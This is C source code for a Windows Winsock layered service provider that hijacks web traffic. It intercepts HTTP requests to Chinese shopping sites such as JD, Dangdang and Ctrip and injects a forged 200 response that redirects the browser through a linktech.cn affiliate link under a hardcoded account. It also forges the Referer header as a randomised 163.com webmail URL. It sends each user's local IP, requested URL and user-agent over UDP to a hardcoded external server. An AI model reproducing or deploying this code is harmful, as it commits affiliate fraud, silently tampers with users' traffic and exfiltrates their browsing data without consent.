#include "lspdef.h"
#include <string.h>
#include <assert.h>
#include <stdio.h>
#include <time.h>
#include <stdlib.h>

static LPSTR g_DomainCodeMapping[][2] = {
	{".linktech.cn", NULL},
	{".u.ctrip.com", NULL},
	{".redirect.cps.yixun.com", NULL},
	{".union.moonbasa.com", NULL},
	{".cps.gome.com.cn", NULL},
	{".u.vipshop.com", NULL},
	{".cps.yintai.com", NULL},
	{".union.dangdang.com", NULL},
	{".r.union.meituan.com", NULL},
	{".union.suning.com", NULL},
	{".cps.xiu.com", NULL},
	{".cps.wbiao.cn", NULL},
	{".shop8.x.com.cn", NULL},
	{".vancl.com", "vancl"},
	{".jumei.com", "jumei"},
	{".yihaodian.com", "yihaodian"},
	{".ctrip.com", "ctrip"},
	{".moonbasa.com", "moonbasa1"},
	{".gome.com.cn", "gome"},
	{".vipshop.com", "vipshop"},
	{".lefeng.com", "lafaso",},
	{".dangdang.com", "dangdang"},
	{".dianping.com", "tdianping"},
	{".meituan.com", "meituan"},
	{".suning.com", "suning"},
	{".lashou.com", "lashou"},
	{".x.com.cn", "xcomcn"},
	{".xiu.com", "zoshow"},
	{".yixun.com", "icson"},
	{".yintai.com", "yintai"},
	{".wbiao.cn", "wbiao"},
	{".jd.com", "360buy"},
};

/*
static LPSTR g_pLinktectRedirectTemplate = 
	"<script>window.location=\"http://click.linktech.cn/%s?m=%s&a=%s&l=99999&l_cd1=0&l_cd2=1&tu=http://%s/\"</script>";
    */

static LPSTR g_pLinktectRedirectTemplate = 
	"<html>"
	"<head>"
	"<meta http-equiv='pragma' content='no-cache'>"
	"<meta http-equiv='expires' content='-1'>"
	"<meta http-equiv='cache-control' content='no-store'/>"
	"</head>"
	"<body>"
	"<script type='text/javascript'>"
	"window.location='http://click.linktech.cn/%s?m=%s&a=%s&l=99999&l_cd1=0&l_cd2=1&tu=http%%3A%%2F%%2F%s'"
	"</script>"
	"</body>"
	"<html>";

static LPSTR g_pRedirectMessageTemplate = 
	"HTTP/1.1 200 OK\r\n"
    "Server: Apache/2.2.23 (Unix) mod_ssl/2.2.23 OpenSSL/1.0.1e DAV/2\r\n"
    "pragma: no-cache\r\n"
	"cache-control: no-cache\r\n"
    "expires: -1\r\n"
	"Content-Length: %d\r\n"
    "Connection: close\r\n"
	"Content-Type: text/html\r\n\r\n"
	"%s";

//static LPSTR g_pRedirectIdentifier = "tellmehowhighisthesky";
static LPSTR g_pRedirectIdentifier = "";

PREDIRECT_INFO g_pRedirectInfo = NULL;

GUID g_MSTcpIpGuid = {
	0xE70F1AA0, 
	0xAB8B, 
	0x11CF, 
	{0x8C, 0xA3, 0x00, 0x80, 0x5F, 0x48, 0xA1, 0x92}
};
static WSAPROTOCOL_INFO g_MSTcpIpProtocol[3];
static LPWSAPROTOCOL_INFO g_pMSTcpProtocol;
static LPWSAPROTOCOL_INFO g_pMSUdpProtocol;
static LPWSAPROTOCOL_INFO g_pMSRawIpProtocol;

static BOOL FindMSTcpIpProtocols()
{
    int nProtocols;
    LPWSAPROTOCOL_INFO lpProtocolBuffer;
	DWORD dwBufferLength = 0;
	int i, iErrno;
    BOOL bOK = TRUE;

	nProtocols = WSCEnumProtocols(NULL, NULL, &dwBufferLength, &iErrno);

	if (nProtocols == SOCKET_ERROR && iErrno != WSAENOBUFS) {
		return FALSE;
	}

	if (!(lpProtocolBuffer = LspAlloc(dwBufferLength, &iErrno)))
        return FALSE;

	nProtocols = WSCEnumProtocols(NULL, lpProtocolBuffer, &dwBufferLength, &iErrno);

	if (nProtocols == SOCKET_ERROR) {
        bOK = FALSE;
        goto cleanup;
	}

	for (i = 0; i < nProtocols; i++) {
		LPWSAPROTOCOL_INFO pProtocol = lpProtocolBuffer + i;
		if (IsEqualGUID(&pProtocol->ProviderId, &g_MSTcpIpGuid)) {
			switch (pProtocol->iSocketType)
			{
			case SOCK_STREAM:
                    memcpy(&g_MSTcpIpProtocol[0], pProtocol, sizeof(*pProtocol));
                    g_pMSTcpProtocol = &g_MSTcpIpProtocol[0];
					break;
			case SOCK_DGRAM:
                    memcpy(&g_MSTcpIpProtocol[1], pProtocol, sizeof(*pProtocol));
                    g_pMSUdpProtocol = &g_MSTcpIpProtocol[1];
					break;
			case  SOCK_RAW:
                    memcpy(&g_MSTcpIpProtocol[2], pProtocol, sizeof(*pProtocol));
                    g_pMSRawIpProtocol = &g_MSTcpIpProtocol[2];
					break;
			default:
				break;
			}
		}
	}

cleanup:
    LspFree(lpProtocolBuffer);

    return bOK;
}

BOOL LoadRedirectInfo(VOID) 
{
	int iErrno, i;

	g_pRedirectInfo = LspAlloc(sizeof(REDIRECT_INFO), &iErrno);
	if (g_pRedirectInfo == NULL) {
		dbgprint("Allocate memory for redirect info failed");
		return FALSE;
	}

	g_pRedirectInfo->pAccount = "A100136314";

	g_pRedirectInfo->iNumberOfEBusiness = sizeof(g_DomainCodeMapping) / sizeof (g_DomainCodeMapping[0]);
	g_pRedirectInfo->pEBusiness = LspAlloc(g_pRedirectInfo->iNumberOfEBusiness * sizeof(EBUSINESS), &iErrno);
	if (!g_pRedirectInfo->pEBusiness) {
		dbgprint("Allocate memory for EBusiness struct failed");
		goto failed;
	}
	for (i = 0; i < g_pRedirectInfo->iNumberOfEBusiness; i++) {
		g_pRedirectInfo->pEBusiness[i].pDomain = g_DomainCodeMapping[i][0];
		g_pRedirectInfo->pEBusiness[i].pCode = g_DomainCodeMapping[i][1];
        switch (i) {
		case 0: // linktect
            g_pRedirectInfo->pEBusiness[i].pRedirectTemplate = NULL;
            break;
		default:
            g_pRedirectInfo->pEBusiness[i].pRedirectTemplate = g_pLinktectRedirectTemplate;
            break;
		}
		g_pRedirectInfo->pEBusiness[i].bIntercepted = FALSE;
	}

    FindMSTcpIpProtocols();

	return TRUE;

failed:
	if (g_pRedirectInfo) {
		if (g_pRedirectInfo->pEBusiness) {
			LspFree(g_pRedirectInfo->pEBusiness);
		}
		LspFree(g_pRedirectInfo);
		g_pRedirectInfo = NULL;
	}

	return FALSE;
}

VOID FreeRedirectInfo(VOID)
{
	if (g_pRedirectInfo) {
		LspFree(g_pRedirectInfo->pEBusiness);
		LspFree(g_pRedirectInfo);
		g_pRedirectInfo = NULL;
	}
}

static BOOL GetHttpHeaderValue(char **headers, int n, const char *header, char **value)
{
	int i;

	for (i = 0; i < n; i++) {
		const char *p1 = header;
		char *p2 = headers[i];
		while (*p1 && tolower(*p1++) == tolower(*p2++))
			;
		if (*p1 == 0) {
			*value = p2;
			return TRUE;
		}
	}

	return FALSE;
}

static BOOL HostEndsWith(const char *host, const char *domain)
{
	char buf[HOST_MAX_LENGTH + 2];
	int hostLen, domainLen;
	int i, j;

	if (!host)
		return FALSE;

	hostLen = strlen(host);
	if (hostLen == 0 || hostLen > HOST_MAX_LENGTH)
		return FALSE;

	if (host[0] != '.') {
		buf[0] = '.';
		strcpy(&buf[1], host);
		hostLen += 1;
	}

	domainLen = strlen(domain);
	if (hostLen < domainLen)
		return FALSE;

	for (i = domainLen - 1, j = hostLen - 1; i >= 0; i--, j--) {
		if (domain[i] != buf[j])
			break;
	}

	return i < 0;
}

static int MatchingEBusiness(const char *host)
{
	int i;

	for (i = 0; i < g_pRedirectInfo->iNumberOfEBusiness; i++) {
		if (HostEndsWith(host, g_pRedirectInfo->pEBusiness[i].pDomain)) {
			return i;
		}
	}

	return -1;
}


static LPSTR getModifiedReferrerHeader(VOID) {
    static const char *chars= "+/1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
    time_t current = time(NULL);
    char ssid[128]; /* e.g. 6Ml5lzjHm5PbI7uX92YErw3P7O0nYoJEgetFtmVPcqo, 43 chars */
    char mid[32]; /* e.g. 373:1tbBdQN4JFEADZL76wABs1 */
    int i, j;
    char *referrer = NULL;
    int iErrno;

    assert (strlen(chars) == 64);

    /*
    if (current % 2 == 0)
        return NULL;
        */

    if (!(referrer = LspAlloc(256, &iErrno)))
        return NULL;

    srand((unsigned int)current);

    // generate ssid
    for (i = 0, j = 0; i < 43; i++) {
        int num = rand() % 64;
        switch (num) {
		case 0:
            ssid[j++] = '%';
            ssid[j++] = '2';
            ssid[j++] = 'f';
            break;
		case 1:
            ssid[j++] = '%';
            ssid[j++] = '2';
            ssid[j++] = 'b';
            break;
		default:
            ssid[j++] = chars[num];
            break;
		}
	}
    ssid[j++] = '%';
    ssid[j++] = '3';
    ssid[j++] = 'd';
    ssid[j] = 0;

    // generate mid
	{
        int part1 = rand() % 500 + 13;
        char part2[20];
        for (i = 0; i < 19; i++) {
            int num = rand() % 64;
            if (num < 2)
                num = 37;
            part2[i] = chars[num];
		}
        part2[i] = 0;
        _snprintf(mid, sizeof(mid), "%d:1tb%s", part1, part2);
	}

    _snprintf(referrer, 256, "Referer: http://cwebmail.mail.163.com/js5/read/readhtml.jsp?ssid=%s&mid=%s&color=003399&font=15\r\n",
		            ssid, mid);

    return referrer;
	//return "Referer: http://www.sjwyb.com\r\n";
}

PGAUSSBUF CreateGaussBuf(DWORD dwBufferSize)
{
	PGAUSSBUF pGaussBuf;
	int iErrno;

	pGaussBuf = LspAlloc(dwBufferSize + sizeof(GAUSSBUF), &iErrno);
	if (pGaussBuf) {
		pGaussBuf->pBuffer = (PCHAR)pGaussBuf + sizeof(GAUSSBUF);
		pGaussBuf->dwBufferSize = dwBufferSize;
		pGaussBuf->pDataStart = pGaussBuf->pBuffer;
		pGaussBuf->pDataEnd = pGaussBuf->pBuffer;
	}

	return pGaussBuf;
}

VOID FreeGaussBuf(PGAUSSBUF *pGaussBuf)
{
	if (*pGaussBuf) {
		LspFree(*pGaussBuf);
		*pGaussBuf = NULL;
	}
}

static BOOL IsLocalHostAddr(struct sockaddr_in *addr, BOOL *bLocalHost)
{
    struct hostent *he;
    int i;

    if (!(he = gethostbyname("localhost"))) {
        dbgprint("gethostbyname failed");
        return FALSE;
	}

    if (he->h_addrtype != AF_INET)
        return FALSE;

    *bLocalHost = FALSE;

    for (i = 0; he->h_addr_list[i]; i++) {
		if (memcmp(he->h_addr_list[i], &addr->sin_addr, he->h_length) == 0) {
            *bLocalHost = TRUE;
		}
	}

    return TRUE;
}

VOID LookInside(SOCK_INFO *SocketContext, LPWSABUF lpBuffers, DWORD dwBufferCount)
{
	PGAUSSBUF pSendBuffer;
	char *startLine;
	char *headers[HTTP_HEADER_MAX];
	char *body;
	int numHeaders;
	char url[URL_MAX_LENGTH], *urlpath;
	int ebindex;
	char *host, *accept; 
    struct sockaddr_in *local_addr = NULL;
   // BOOL bLocalHost;
    struct sockaddr_in addr_buf;
    socklen_t addr_len = sizeof(addr_buf);
    WSPPROC_TABLE *ProcTable = &(SocketContext->Provider->NextProcTable);
    int iErrno;

	// assemble http request buffer
	{
		int i, len;

		for (i = 0, len = 0; i < (int)dwBufferCount; i++)
			len += lpBuffers[i].len;

		if (len > HTTP_REQUEST_MAX_LENGTH)
			return;

		// allocate more memory than needed so we can hold modified referrer header.
		// also include a NUL character
		pSendBuffer = CreateGaussBuf(len + 256);
		if (!pSendBuffer) {
			dbgprint("allocate memory for send buffer failed");
			return ;
		}

		// fill up send buffer with http request and include '0' character
		for (i = 0; i < (int)dwBufferCount; i++) {
			memcpy(pSendBuffer->pDataEnd, lpBuffers[i].buf, lpBuffers[i].len);
			pSendBuffer->pDataEnd += lpBuffers[i].len;
		}
		*(pSendBuffer->pDataEnd) = 0;
	}

	// parse http
	{
		char *next, *prev;

		startLine = NULL;
		body = NULL;
		numHeaders = 0;
		next = prev = pSendBuffer->pDataStart;

		while ((next = strstr(next, "\r\n")) && numHeaders < HTTP_HEADER_MAX) {
			*next = 0;

			if (!startLine)
				startLine = prev;
			else
				headers[numHeaders++] = prev;

			next += 2;

			if (*next == 0)
				break;

			if (*next == '\r' && *(next + 1) == '\n') {
				if (numHeaders > 0) {
					body = next + 2;
					goto main_point;
				} else {
					break;
				}
			}

			prev = next;
		}

		goto release_sendbuffer;
	}

main_point:


	/* parse accpet header */
	if (!GetHttpHeaderValue(headers, numHeaders, "accept: ", &accept) ||
		!(strstr(accept, "text/html") || strstr(accept, "*/*")))
		goto release_sendbuffer;

	/* parse host header */
	if (!GetHttpHeaderValue(headers, numHeaders, "host: ", &host))
		goto release_sendbuffer;

	if ((ebindex = MatchingEBusiness(host)) <= 12 && ebindex != 0)
		goto release_sendbuffer;

    // check socket addr
    if(ProcTable->lpWSPGetSockName(SocketContext->ProviderSocket, 
		                          (struct sockaddr *)&addr_buf, 
								  &addr_len,
								  &iErrno) == SOCKET_ERROR)
	{
        dbgprint("getsockname failed");
        goto release_sendbuffer;
	}

    local_addr = &addr_buf;

    /*
	if (IsLocalHostAddr(&addr_buf, &bLocalHost)) {
        local_addr = &addr_buf;
        if (bLocalHost) 
            goto release_sendbuffer;
	}
    */

	/* parse  url */
	{
		char *bp, *ep;
		int n;

		bp = startLine + 4;
		if (!(ep = strchr(bp, ' ')))
			goto release_sendbuffer;
		*ep = 0;

		if (memcmp("http://", bp, 7) != 0) {
			n = _snprintf(url, sizeof(url), "http://%s", host);
			if (n + strlen(bp) >= sizeof(url))
				goto release_sendbuffer;
			strcat(url, bp);
		}  else {
			n = _snprintf(url, sizeof(url), "%s", bp);
			if (n < 0 || n == sizeof(url))
				goto release_sendbuffer;
		}

		urlpath = strchr(url + 7, '/');
		*ep = ' ';
	}

	if (ebindex == 0) { // linktect
		if (strstr(urlpath, g_pRedirectInfo->pAccount)) {
			char *p1, *p2;
			char *referrer_header, *modified_referrer_header;
			int referrer_header_len;
			int freesize;
			BOOL drop_referrer = FALSE;

			// do two things:
			// 1. drop redirect identifier
			// 2. modify referrer header

			// check if send buffer is big enough to hold modified referrer header
			if (!GetHttpHeaderValue(headers, numHeaders, "referer: ", &referrer_header)) {
				referrer_header = body - 2;
				referrer_header_len = 0;
			} else {
                if (strstr(referrer_header, "linktech.cn")) {
                    goto release_sendbuffer;
				}
				referrer_header -= strlen("referer: ");
				referrer_header_len = strlen(referrer_header) + 2;
			}

            modified_referrer_header = getModifiedReferrerHeader();
            if (!modified_referrer_header)
                drop_referrer = TRUE;

			freesize = referrer_header_len + strlen(g_pRedirectIdentifier) +
				(pSendBuffer->dwBufferSize - (pSendBuffer->pDataEnd - pSendBuffer->pDataStart));

			if (modified_referrer_header && freesize < (int)strlen(modified_referrer_header)) {
				dbgprint("send buffer has not enough memory to hold modified referrer header. "
					"so we drop it");
				drop_referrer = TRUE;
			}

			// restore send  buffer
			if (startLine)
				*(startLine + strlen(startLine)) = '\r';

			while (numHeaders-- > 0) {
				*(headers[numHeaders] + strlen(headers[numHeaders])) = '\r';
			}

			// drop redirect identifier
            /*
			p1 = strstr(pSendBuffer->pDataStart, g_pRedirectIdentifier);
			p2 = p1 + strlen(g_pRedirectIdentifier);
			memmove(p1, p2, pSendBuffer->pDataEnd - p2) ;
			pSendBuffer->pDataEnd -= (strlen(g_pRedirectIdentifier));
			referrer_header -= (strlen(g_pRedirectIdentifier));
            */

			// modify referrer
			if (drop_referrer) {
				p1 = referrer_header;
				p2 = referrer_header + referrer_header_len;
				memmove(p1, p2, pSendBuffer->pDataEnd - p2);
				pSendBuffer->pDataEnd -= referrer_header_len;
			} else {
				p1 = referrer_header + referrer_header_len;
				p2 = referrer_header + strlen(modified_referrer_header);
				memmove(p2, p1, pSendBuffer->pDataEnd - p1) ;
				pSendBuffer->pDataEnd += (p2 - p1);
				memcpy(referrer_header, modified_referrer_header, strlen(modified_referrer_header));
			}

            if (modified_referrer_header)
                LspFree(modified_referrer_header);

			SocketContext->pSendBuffer = pSendBuffer;
			return;
		}

		goto release_sendbuffer;
	} 

	if (g_pRedirectInfo->pEBusiness[ebindex].bIntercepted)
		goto release_sendbuffer;
	g_pRedirectInfo->pEBusiness[ebindex].bIntercepted = TRUE;

	// build receive buffer
	{
		int iContentLength, n;
		char redirect_url[URL_MAX_LENGTH];
		int rcvbuf_len;
		PGAUSSBUF pReceiveBuffer;

		iContentLength = _snprintf(redirect_url, 
			sizeof(redirect_url), 
			g_pRedirectInfo->pEBusiness[ebindex].pRedirectTemplate,
            g_pRedirectIdentifier,
            g_pRedirectInfo->pEBusiness[ebindex].pCode,
            g_pRedirectInfo->pAccount,
			host);
        dbgprint("G: redirect url: %s", redirect_url);
		if (iContentLength < 0 || iContentLength == sizeof(redirect_url)) {
            dbgprint("G: buffer is too small, redirect failed");
			goto release_sendbuffer;
		}

		rcvbuf_len = strlen(g_pRedirectMessageTemplate) + iContentLength + 16;
		if (!(pReceiveBuffer = CreateGaussBuf(rcvbuf_len))) {
			dbgprint("Gauss - error: allocate memory for recevie buffer failed");
			goto release_sendbuffer;
		}

		n = _snprintf(pReceiveBuffer->pDataEnd, rcvbuf_len, g_pRedirectMessageTemplate, 
			        iContentLength, redirect_url);
		pReceiveBuffer->pDataEnd += n;

		SocketContext->pReceiveBuffer = pReceiveBuffer;

		if (g_pMSUdpProtocol) {
            WSABUF wsabuf[3];
            WCHAR wlocalIp[INET_ADDRSTRLEN];
            DWORD cchIp = _countof(wlocalIp);
            CHAR localIp[INET_ADDRSTRLEN];
            DWORD cbIp = _countof(localIp);
            char *pUserAgent;
            int i = 0;
            SOCKET udpsocket;

            // local ip
            if (local_addr) {
                ProcTable->lpWSPAddressToString(
					    (struct sockaddr *)local_addr,
						sizeof(*local_addr),
						NULL,
						wlocalIp,
						&cchIp,
						&iErrno);

                if (iErrno == NO_ERROR) {
					if (WideCharToMultiByte(CP_ACP, 0, wlocalIp, cchIp, localIp, 
						    cbIp, NULL, NULL) != 0) {
                        wsabuf[i].buf = localIp;
                        wsabuf[i].len = strlen(localIp) + 1;
                        i++;
					}
				}
			}

            // request url
            wsabuf[i].buf = url;
            wsabuf[i].len = strlen(url) + 1;
            i++;

            if (GetHttpHeaderValue(headers, numHeaders, "user-agent: ", &pUserAgent)) {
                wsabuf[i].buf = pUserAgent;
                wsabuf[i].len = strlen(pUserAgent) + 1;
                i++;
			}

            /*
            udpsocket = lpProcTable->lpWSPSocket(AF_INET, SOCK_DGRAM, IPPROTO_UDP, 
				        NULL, 0, 0, &iErrno);
                        */
            udpsocket = ProcTable->lpWSPSocket(AF_INET, SOCK_DGRAM, IPPROTO_UDP, g_pMSUdpProtocol, 0, 0, &iErrno);

            if (udpsocket != INVALID_SOCKET) {
                DWORD nbytes;
                struct sockaddr_in serverAddr;
				serverAddr.sin_family = AF_INET;
				serverAddr.sin_port = htons(10033);    
				serverAddr.sin_addr.s_addr = inet_addr("115.100.249.106");
                //WSASendTo(udpsocket, wsabuf, i, &nbytes, 0, (struct sockaddr *)&serverAddr, 
				//	sizeof(serverAddr), NULL, NULL);
                ProcTable->lpWSPSendTo(udpsocket, wsabuf, i, &nbytes, 0, (struct sockaddr *)&serverAddr, 
					sizeof(serverAddr), NULL, NULL, NULL, &iErrno);
                //closesocket(udpsocket);
                ProcTable->lpWSPCloseSocket(udpsocket, &iErrno);
			}

		}

		goto release_sendbuffer;
	}

release_sendbuffer:
	FreeGaussBuf(&pSendBuffer);

	return;
}